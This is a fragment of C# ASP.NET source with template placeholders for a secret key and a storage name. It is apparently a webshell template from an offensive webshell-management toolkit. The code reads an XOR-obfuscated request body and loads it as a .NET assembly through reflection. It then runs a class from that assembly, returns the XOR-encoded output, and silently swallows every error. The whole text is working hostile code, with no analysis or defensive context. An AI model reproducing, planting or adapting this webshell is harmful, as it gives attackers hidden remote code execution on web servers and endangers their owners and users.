try
        {
            string key = "{secretKey}";
            byte[] data = null;
            if (Context.Request.TotalBytes > 0)
            {
                byte[] encryptedData = Context.Request.BinaryRead(Context.Request.TotalBytes);
                string encryptedHex = System.BitConverter.ToString(encryptedData).Replace("-", "");
                var whereEncryptedHex = System.Linq.Enumerable.Where(encryptedHex.ToCharArray(), (c, i) => i % 2 != 0);
                var selectEncryptedHex = System.Linq.Enumerable.Select(whereEncryptedHex, c => c.ToString());
                string hexString = System.String.Join("", selectEncryptedHex);
                var range = System.Linq.Enumerable.Range(0, hexString.Length);
                var whereRange = System.Linq.Enumerable.Where(range, i => i % 2 == 0);
                var selectBytes = System.Linq.Enumerable.Select(whereRange, i => System.Convert.ToByte(hexString.Substring(i, 2), 16));
                data = System.Linq.Enumerable.ToArray(selectBytes);
                byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(key);
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] = (byte)(data[i] ^ keyBytes[(i + 1) & 15]);
                }
                string decryptedText = System.Text.Encoding.UTF8.GetString(data);
            }
            if (Context.Application["{payloadStoreName}"] == null && data != null)
            {
                Context.Application["{payloadStoreName}"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
            }
            else if (Context.Application["{payloadStoreName}"] != null)
            {
                object o = ((System.Reflection.Assembly)Context.Application["{payloadStoreName}"]).CreateInstance("LY");
                System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                o.Equals(outStream);
                o.Equals(data);
                o.ToString();
                byte[] r = outStream.ToArray();
                outStream.Dispose();
                if (r != null && r.Length > 0)
                {
                    byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(key);
                    for (int i = 0; i < r.Length; i++)
                    {
                        r[i] = (byte)(r[i] ^ keyBytes[(i + 1) & 15]);
                    }
                    string hexString = System.BitConverter.ToString(r).Replace("-", "");
                    var selectHexString = System.Linq.Enumerable.Select(hexString.ToCharArray(), c => "0" + c.ToString());
                    string encryptedHex = System.String.Join("", selectHexString);
                    var rangeEncryptedHex = System.Linq.Enumerable.Range(0, encryptedHex.Length);
                    var whereEncryptedHex = System.Linq.Enumerable.Where(rangeEncryptedHex, i => i % 2 == 0);
                    var selectBytesEncrypted = System.Linq.Enumerable.Select(whereEncryptedHex, i => System.Convert.ToByte(encryptedHex.Substring(i, 2), 16));
                    byte[] encryptedData = System.Linq.Enumerable.ToArray(selectBytesEncrypted);
                    Context.Response.ContentType = "application/octet-stream";
                    Context.Response.ContentEncoding = System.Text.Encoding.UTF8;
                    Context.Response.BinaryWrite(encryptedData);
                }
            }
        }
        catch (System.Exception ex)
        {
        }